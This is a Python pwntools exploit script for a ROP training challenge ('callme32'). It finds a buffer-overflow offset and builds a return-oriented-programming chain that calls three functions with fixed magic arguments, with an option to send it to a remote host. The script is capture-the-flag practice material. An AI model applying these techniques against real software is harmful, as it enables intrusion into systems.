#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    proc = start()
    proc.sendlineafter(b'>', payload)
    proc.wait()
    ip_offset = cyclic_find(proc.corefile.pc)
    return ip_offset

exe = './callme32'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'error'

# crafting the payload
offset = find_offset(cyclic(100))
info(f"Offset: {offset:x}")

clean_stack_gadget = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
info(f"Clean Stack Gadget: {clean_stack_gadget}")

payload = flat({ offset: [
        elf.symbols.callme_one,
        clean_stack_gadget,
        0xdeadbeef,
        0xcafebabe,
        0xd00df00d,
        elf.symbols.callme_two,
        clean_stack_gadget,
        0xdeadbeef,
        0xcafebabe,
        0xd00df00d,
        elf.symbols.callme_three,
        clean_stack_gadget,
        0xdeadbeef,
        0xcafebabe,
        0xd00df00d
    ] })

write('payload', payload)
info(f"Payload: {payload}")

# executing the exploit
io = start()
io.sendlineafter(b'>', payload)
io.interactive()
